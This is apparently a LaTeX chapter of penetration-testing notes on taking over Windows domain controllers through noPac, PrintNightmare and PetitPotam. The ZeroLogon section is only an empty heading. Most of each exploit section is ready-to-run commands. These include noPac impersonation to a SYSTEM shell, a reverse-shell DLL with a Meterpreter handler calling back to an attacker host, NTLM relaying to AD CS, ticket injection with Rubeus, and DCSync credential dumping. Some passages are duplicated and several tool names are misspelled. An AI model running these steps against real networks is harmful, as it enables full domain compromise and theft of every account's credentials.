\chapter{From CVE to SYSTEM shell on DC}

\section{samAccountName spoofing}

\subsection{Intro}
the
\href{https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699}{Sam\_The\_Admin vulnerability}, 
also called \emph{noPac} or  \emph{SamAccountName Spoofing}
released at the end of 2021. 

It encompasses two CVEs 2021-42278 (is a bypass vulnerability with the
SAM) and 2021-42287 (is a vulnerability within the Kerberos
Privilege Attribute Certificate (PAC) in ADDS) , allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command. 


This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain. When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller. The flow of the attack is outlined in detail in this blog post.

This exploit path takes advantage of being able to change the
\verb+SamAccountName+ of a computer account to that of a Domain Controller. By
default, authenticated users can add up to
\href{https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain}{ten
computers to a domain}. When doing so, the name must be  changed to match a
Domain Controller's SamAccountName. Once done,  when a kerberos ticket is
requested  the service  issue a tickets under the DC's name instead of the new
name. When a TGS is requested, it will issue the ticket with the closest
matching name. Once done, this allow to have access as that service and can
even be provided with a SYSTEM shell on a Domain Controller. The flow of the
attack is outlined in detail in this
\href{https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware}{blog post}.

\href{https://github.com/Ridter/noPac}{noPac tool} allow to perform the attack and rely on Impacket.

\subsection{Exploit}

\begin{verbatim}
# Scanning for noPac
sudo python3 scanner.py DOMAIN.NAME/LOGIN:password -dc-ip IP -use-ldap

# Running NoPac & Getting a Shell
sudo python3 noPac.py DOMAIN.NAME/LOGIN:password -dc-ip IP -dc-host HOST_NAME \
    -shell --impersonate administrator -use-ldap
\end{verbatim}

{\bf note}:
\begin{itemize}
    \item a semi-interactive shell session is established with the target using
        smbexec.py.
    \item TGTi are saved  in the directory on the attack host where the exploit was run.
\end{itemize}

Using the ccache file it is possible to perform a
pass-the-ticket~\ref{kerberos:pth} and perform further attacks such as
DCSync~\ref{kerberos:DCSync}. 

It is possible with the \verb+-dump+ flag to perform a DCSync using
secretsdump.py. This method would still create a ccache file on disk.

\subsection{Windows Defender and SMBEXEC.py Considerations}
If Windows Defender (or another AV or EDR product) is enabled on a target, the
shell session may be established, but issuing any commands will likely fail.
The first thing smbexec.py does is create a service called BTOBTO. Another
service called BTOBO is created, and any command typed is sent to the target
over SMB inside a .bat file called execute.bat. With each new command typed, a
new batch script is created and echoed to a temporary file that executes said
script and deletes it from the system. Let's look at a Windows Defender log to
see what behavior was considered malicious.


\section{PrintNightmare}
\subsection{Intro}
PrintNightmare is the nickname given to two vulnerabilities (CVE-2021-34527 and
CVE-2021-1675) found in the
\href{https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc}{Print
Spooler service} that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution. 


\subsection{metasploit}
\verb+use exploit/windows/local/ricoh_driver_privesc+
\subsection{Exploit}
\begin{enumerate}
    \item \verb+git clone https://github.com/cube0x0/CVE-2021-1675.git+
    \item verify if \emph{Print System Asynchronous Protocol} and
\emph{Print System Remote Protocol} are exposed on the target.
\begin{verbatim}
\verb+rpcdump.py @DC-IP | egrep 'MS-RPRN|MS-PAR'+
\end{verbatim}

    \item Craft a DLL reverse shell with msfvenom~\ref{tool:metasploit:msfvenom}
    \item host the DLL shell with
        \verb+smbserver+~\ref{tool:impacket:smbserver}
    \item Configuring \& Starting metasploit multi/handler:
\begin{verbatim}
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST IP
set LPORT PORT
run
\end{verbatim}
    \item run the exploit:
\begin{verbatim}
sudo python3 CVE-2021-1675.py DOMAIN.NAME/login:pawword@DC-IP \
    '\\LHOST\PATH\TO\DLL'
\end{verbatim}
    \item Metasploit drop into SYSTEM shell
\begin{verbatim}
shell
whoami
\end{verbatim}
\end{enumerate}

\section{PetitPotam (MS-EFSRPC)}

\subsection{Intro}

PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that was patched
in August of 2021. The flaw allows an unauthenticated attacker to coerce a
Domain Controller to authenticate against another host using NTLM over port 445
via the
\href{https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc}{Local
Security Authority Remote Protocol (LSARPC)} by abusing Microsoftâ€™s
\href{https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31}{Encrypting
File System Remote Protocol (MS-EFSRPC)}. This technique allows an
unauthenticated attacker to take over a Windows domain where
\href{https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs}{Active
Directory Certificate Services (AD CS)} is in use. 

In the attack, an authentication request from the targeted Domain Controller is
relayed to the Certificate Authority (CA) host's Web Enrollment page and makes
a Certificate Signing Request (CSR) for a new digital certificate. This
certificate can then be used with a tool such as Rubeus or gettgtpkinit.py from
PKINITtools to request a TGT for the Domain Controller, which can then be used
to achieve domain compromise via a DCSync attack~\ref{kerberos:DCSync}.

\href{https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/}{This blog
post} goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.

\subsection{Exploit }
\begin{itemize}
    \item  start \verb+ntlmrelayx.py+ on the attack host, specifying the Web
        Enrollment URL for the CA host and using either the
        KerberosAuthentication or DomainController AD CS template (use 
        \href{https://github.com/zer1t0/certi}{certi} to find the URL of the
    CA):
\begin{verbatim}
sudo ntlmrelayx.py -debug -smb2support \
    --target http://CA_FQDN/certsrv/certfnsh.asp \
    --adcs --template DomainController
\end{verbatim}
    \item run \href{https://github.com/topotam/PetitPotam}{PotitPotam.py} to
        attempt to coerce the Domain Controller to authenticate to ths
        attacker:
\begin{verbatim}
python3 PetitPotam.py ATTACK_IP DC_IP
\end{verbatim}
    \item \verb+ntlmrelayx.py+ Catch the  Base64 Encoded Certificate for DC
    \item Requesting a TGT Using \verb+gettgtpkinit.py+:
\begin{verbatim}
python3 /opt/PKINITtools/gettgtpkinit.py DOMAIN.NAME/DC-NAME\$ \
    -pfx-base64 $BASE64_CERTIFICATE    dc.ccache
\end{verbatim}

    \item Setting the \verb+KRB5CCNAME+ Environment Variable:
\begin{verbatim}
export KRB5CCNAME=dc.ccache
\end{verbatim}

    \item Using Domain Controller TGT to DCSync with \verb+secretsdump.py+~\ref{tool:impacket:secretsdump:remote:NTDS}
    \item validate with \verb+klist+ from \verb+krb5-user+ package.
    \item Confirming Admin Access to the Domain Controller:
\begin{verbatim}
crackmapexec smb DC_IP -u administrator -H NT_HASH 
\end{verbatim}
\end{itemize}

\subsection{Using Rubeus}
After getting the TGT 
\begin{enumerate}
    \item use Reubus it is possible to use Reubus:
\begin{verbatim}
.\Rubeus.exe asktgt /user:DC_NAME$ /certificate BASE64_CERTIF /ptt
\end{verbatim}

    \item Confirming the Ticket is in Memory with \verb+klist+
    \item DCSync with mimikatz~\ref{tool:mimikatz:cred-dumping}
\end{enumerate}

\section{ZeroLogon}

